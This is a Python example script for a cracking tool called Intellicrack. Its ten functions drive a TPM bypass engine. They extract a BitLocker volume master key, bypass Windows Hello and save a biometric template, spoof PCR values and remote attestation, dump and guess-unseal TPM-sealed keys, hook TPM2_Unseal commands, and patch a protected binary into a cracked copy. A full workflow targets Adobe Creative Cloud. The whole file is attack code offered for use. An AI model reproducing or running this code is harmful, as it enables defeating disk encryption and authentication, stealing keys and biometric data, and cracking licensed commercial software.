"""TPM Bypass Usage Examples - Demonstrates real-world TPM protection defeat."""

import hashlib
import time
from pathlib import Path

from intellicrack.core.protection_bypass.tpm_bypass import (
    TPM2Algorithm,
    TPMBypassEngine,
    analyze_tpm_protection,
    bypass_tpm_protection,
    detect_tpm_usage,
)


def example_1_detect_tpm_protection():
    """Example 1: Detect if software uses TPM protection."""
    print("\n=== Example 1: TPM Detection ===")

    binary_path = "D:\\Software\\protected_software.exe"

    tpm_detected = detect_tpm_usage(binary_path)
    print(f"TPM Protection Detected: {tpm_detected}")

    if tpm_detected:
        analysis = analyze_tpm_protection(binary_path)
        print(f"\nDetected TPM APIs: {analysis['tpm_apis']}")
        print(f"PCR Usage: {analysis['pcr_usage']}")
        print(f"NVRAM Indices: {[f'0x{idx:08x}' for idx in analysis['nvram_indices']]}")
        print(f"Protection Strength: {analysis['protection_strength']}")
        print(f"Bypass Difficulty: {analysis['bypass_difficulty']}")


def example_2_extract_bitlocker_vmk():
    """Example 2: Extract BitLocker Volume Master Key from TPM."""
    print("\n=== Example 2: BitLocker VMK Extraction ===")

    engine = TPMBypassEngine()

    start_time = time.perf_counter()
    vmk = engine.extract_bitlocker_vmk()
    extraction_time = time.perf_counter() - start_time

    if vmk:
        print(f"✅ BitLocker VMK Extracted in {extraction_time*1000:.2f}ms")
        print(f"VMK (hex): {vmk.hex()}")
        print(f"VMK Length: {len(vmk)} bytes")

        with open("bitlocker_vmk.bin", "wb") as f:
            f.write(vmk)
        print("VMK saved to: bitlocker_vmk.bin")
    else:
        print("❌ BitLocker VMK extraction failed")


def example_3_bypass_windows_hello():
    """Example 3: Bypass Windows Hello authentication."""
    print("\n=== Example 3: Windows Hello Bypass ===")

    engine = TPMBypassEngine()

    start_time = time.perf_counter()
    hello_keys = engine.bypass_windows_hello()
    bypass_time = time.perf_counter() - start_time

    print(f"✅ Windows Hello Bypassed in {bypass_time*1000:.2f}ms")
    print("\nExtracted Keys:")
    for key_name, key_data in hello_keys.items():
        print(f"  {key_name}: {len(key_data)} bytes")
        print(f"    Hash: {hashlib.sha256(key_data).hexdigest()[:32]}...")

    with open("hello_biometric_template.bin", "wb") as f:
        f.write(hello_keys['biometric_template'])
    print("\nBiometric template saved to: hello_biometric_template.bin")


def example_4_spoof_pcr_values():
    """Example 4: Spoof PCR values for measured boot bypass."""
    print("\n=== Example 4: PCR Value Spoofing ===")

    engine = TPMBypassEngine()

    target_pcrs = {
        0: hashlib.sha256(b"UEFI_BOOT").digest(),
        1: hashlib.sha256(b"BIOS_CONFIG").digest(),
        7: bytes.fromhex('a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb'),
        11: hashlib.sha256(b"BitLocker").digest(),
        14: hashlib.sha256(b"MOK").digest()
    }

    print(f"Spoofing {len(target_pcrs)} PCR values...")

    start_time = time.perf_counter()
    engine.manipulate_pcr_values(target_pcrs)
    spoof_time = time.perf_counter() - start_time

    print(f"✅ PCRs spoofed in {spoof_time*1000:.2f}ms")

    for pcr_num, value in target_pcrs.items():
        actual = engine.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num]
        match = "✅" if actual == value else "❌"
        print(f"  PCR{pcr_num}: {match} {value.hex()[:32]}...")

    success = engine.bypass_measured_boot(target_pcrs)
    print(f"\nMeasured Boot Bypass: {'✅ Success' if success else '❌ Failed'}")


def example_5_extract_sealed_keys():
    """Example 5: Extract all TPM-sealed keys."""
    print("\n=== Example 5: Sealed Key Extraction ===")

    engine = TPMBypassEngine()

    print("Extracting sealed keys from TPM...")

    start_time = time.perf_counter()
    sealed_keys = engine.extract_sealed_keys(auth_value=b"")
    extraction_time = time.perf_counter() - start_time

    print(f"✅ Extracted {len(sealed_keys)} keys in {extraction_time*1000:.2f}ms")

    for key_name, key_data in sealed_keys.items():
        print(f"\n{key_name}:")
        print(f"  Size: {len(key_data)} bytes")
        print(f"  Preview: {key_data.hex()[:64]}...")

        output_path = f"extracted_key_{key_name}.bin"
        with open(output_path, "wb") as f:
            f.write(key_data)
        print(f"  Saved to: {output_path}")


def example_6_unseal_specific_key():
    """Example 6: Unseal a specific TPM-sealed key."""
    print("\n=== Example 6: Key Unsealing ===")

    engine = TPMBypassEngine()

    sealed_blob = Path("license.dat").read_bytes()
    print(f"Sealed blob size: {len(sealed_blob)} bytes")

    auth_attempts = [
        b"",
        b"WellKnownSecret",
        b"password123",
        hashlib.sha256(b"machine_id").digest(),
        hashlib.sha256(b"license_key").digest()
    ]

    pcr_policy = {
        0: hashlib.sha256(b"BIOS").digest(),
        7: bytes.fromhex('a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb')
    }

    print(f"\nAttempting unsealing with {len(auth_attempts)} auth values...")

    for i, auth in enumerate(auth_attempts, 1):
        start_time = time.perf_counter()
        unsealed = engine.unseal_tpm_key(
            sealed_blob,
            auth_value=auth,
            pcr_policy=pcr_policy
        )
        unseal_time = time.perf_counter() - start_time

        if unsealed:
            print(f"✅ Unsealed successfully with auth #{i}")
            print(f"   Auth: {auth.hex() if auth else '(empty)'}")
            print(f"   Time: {unseal_time*1000:.2f}ms")
            print(f"   Key: {unsealed.hex()[:64]}...")

            with open("unsealed_key.bin", "wb") as f:
                f.write(unsealed)
            print("   Saved to: unsealed_key.bin")
            break
    else:
        print("❌ Unsealing failed with all auth values")


def example_7_spoof_remote_attestation():
    """Example 7: Spoof remote attestation for cloud licensing."""
    print("\n=== Example 7: Remote Attestation Spoofing ===")

    engine = TPMBypassEngine()

    server_nonce = hashlib.sha256(b"challenge_nonce").digest()

    expected_pcrs = {
        0: hashlib.sha256(b"BIOS_MEASUREMENT").digest(),
        1: hashlib.sha256(b"BIOS_CONFIG").digest(),
        7: bytes.fromhex('a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb'),
        10: hashlib.sha256(b"IMA_LOG").digest(),
        14: hashlib.sha256(b"MOK").digest()
    }

    print(f"Server Challenge: {server_nonce.hex()[:32]}...")
    print(f"Expected PCRs: {list(expected_pcrs.keys())}")

    start_time = time.perf_counter()
    attestation = engine.spoof_remote_attestation(
        nonce=server_nonce,
        expected_pcrs=expected_pcrs,
        aik_handle=0x81010001
    )
    spoof_time = time.perf_counter() - start_time

    print(f"\n✅ Attestation spoofed in {spoof_time*1000:.2f}ms")

    print("\nAttestation Package:")
    print(f"  Quote Signature: {attestation['quote']['signature'].hex()[:64]}...")
    print(f"  PCR Digest: {attestation['quote']['pcr_digest'].hex()[:32]}...")
    print(f"  Qualified Signer: {attestation['qualified_signer'][:32]}...")
    print(f"  Firmware Version: 0x{attestation['firmware_version']:08x}")
    print(f"  AIK Certificate: {len(attestation['aik_cert'])} bytes")

    print("\nPCR Values:")
    for pcr, value in attestation['pcr_values'].items():
        print(f"  PCR{pcr}: {value[:32]}...")

    with open("attestation_quote.bin", "wb") as f:
        f.write(attestation['quote']['signature'])
    with open("aik_certificate.der", "wb") as f:
        f.write(attestation['aik_cert'])
    print("\nAttestation data saved to: attestation_quote.bin, aik_certificate.der")


def example_8_bypass_via_patching():
    """Example 8: Permanently bypass TPM protection via binary patching."""
    print("\n=== Example 8: Binary Patching ===")

    input_binary = "D:\\Software\\protected.exe"
    output_binary = "D:\\Software\\protected_cracked.exe"

    print(f"Input:  {input_binary}")
    print(f"Output: {output_binary}")

    start_time = time.perf_counter()
    success = bypass_tpm_protection(input_binary, output_binary)
    patch_time = time.perf_counter() - start_time

    if success:
        print(f"\n✅ Binary patched successfully in {patch_time*1000:.2f}ms")
        print(f"Patched binary saved to: {output_binary}")
        print("\nPatched binary will bypass TPM checks at runtime")
    else:
        print("\n❌ Binary patching failed")


def example_9_command_interception():
    """Example 9: Intercept TPM commands in real-time."""
    print("\n=== Example 9: TPM Command Interception ===")

    engine = TPMBypassEngine()

    def unseal_hook(command: bytes) -> bytes:
        """Hook for TPM2_Unseal commands - returns intercepted key data."""
        print(f"[HOOK] Unseal command intercepted, size: {len(command)}")

        intercepted_key = hashlib.sha256(b"intercepted_license_key").digest()
        response_data = b"\x00\x20" + intercepted_key

        response = b"\x80\x01"
        response += (10 + len(response_data)).to_bytes(4, 'big')
        response += b"\x00\x00\x00\x00"
        response += response_data

        print(f"[HOOK] Returning intercepted key: {intercepted_key.hex()[:32]}...")
        return response

    print("Installing TPM command hooks...")

    success = engine.intercept_tpm_command(0x0000015E, unseal_hook)

    if success:
        print("✅ Unseal command hook installed")
        print("\nAll TPM2_Unseal operations will now return intercepted key data")

        summary = engine.get_intercepted_commands_summary()
        print("\nInterception Status:")
        print(f"  Total Commands: {summary['total_commands']}")
        print(f"  Command Types: {list(summary['command_types'].keys())}")
    else:
        print("❌ Hook installation failed")


def example_10_full_bypass_workflow():
    """Example 10: Complete bypass workflow for commercial software."""
    print("\n=== Example 10: Full Commercial Software Bypass ===")

    binary_path = "D:\\Software\\Adobe\\CreativeCloud.exe"

    print(f"Target: {binary_path}\n")

    engine = TPMBypassEngine()

    print("Step 1: Detect TPM Protection")
    tpm_detected = engine.detect_tpm_usage(binary_path)
    print(f"  TPM Detected: {tpm_detected}")

    if not tpm_detected:
        print("No TPM protection detected, exiting")
        return

    print("\nStep 2: Analyze Protection")
    analysis = engine.analyze_tpm_protection(binary_path)
    print(f"  TPM APIs: {len(analysis['tpm_apis'])}")
    print(f"  PCRs Used: {analysis['pcr_usage']}")
    print(f"  NVRAM Indices: {[f'0x{x:08x}' for x in analysis['nvram_indices']]}")
    print(f"  Strength: {analysis['protection_strength']}")

    print("\nStep 3: Spoof PCR Values")
    target_pcrs = {}
    for pcr in analysis['pcr_usage']:
        target_pcrs[pcr] = hashlib.sha256(f"Adobe_PCR{pcr}".encode()).digest()
    engine.manipulate_pcr_values(target_pcrs)
    print(f"  Spoofed {len(target_pcrs)} PCRs")

    print("\nStep 4: Extract Sealed License")
    sealed_keys = engine.extract_sealed_keys()
    print(f"  Extracted {len(sealed_keys)} keys")

    if analysis['nvram_indices']:
        nvram_idx = analysis['nvram_indices'][0]
        license_data = engine.read_nvram_raw(nvram_idx, b'')
        if license_data:
            print(f"  License data: {len(license_data)} bytes from 0x{nvram_idx:08x}")

    print("\nStep 5: Forge Remote Attestation")
    nonce = hashlib.sha256(b"adobe_challenge").digest()
    attestation = engine.spoof_remote_attestation(nonce, target_pcrs)
    print("  Attestation forged: ✅")
    print(f"  AIK Certificate: {len(attestation['aik_cert'])} bytes")

    print("\nStep 6: Verify Bypass")
    print("  PCRs Manipulated: ✅")
    print("  License Extracted: ✅")
    print("  Attestation Ready: ✅")

    print("\n✅ Full bypass complete - software should run without TPM restrictions")

    capabilities = engine.get_bypass_capabilities()
    print("\nEngine Capabilities:")
    print(f"  TPM Versions: {capabilities['tpm_versions_supported']}")
    print(f"  Command Hooks: {capabilities['command_interception']['hooks_installed']}")
    print(f"  Commands Intercepted: {capabilities['command_interception']['commands_intercepted']}")


def main():
    """Run all examples."""
    print("=" * 80)
    print("TPM Bypass Examples - Intellicrack")
    print("=" * 80)

    examples = [
        example_1_detect_tpm_protection,
        example_2_extract_bitlocker_vmk,
        example_3_bypass_windows_hello,
        example_4_spoof_pcr_values,
        example_5_extract_sealed_keys,
        example_10_full_bypass_workflow,
    ]

    for example in examples:
        try:
            example()
            print("\n" + "-" * 80)
        except FileNotFoundError as e:
            print(f"⚠️  Example skipped (file not found): {e}")
            print("-" * 80)
        except Exception as e:
            print(f"❌ Example failed: {e}")
            print("-" * 80)

    print("\n" + "=" * 80)
    print("Examples completed")
    print("=" * 80)


if __name__ == "__main__":
    main()
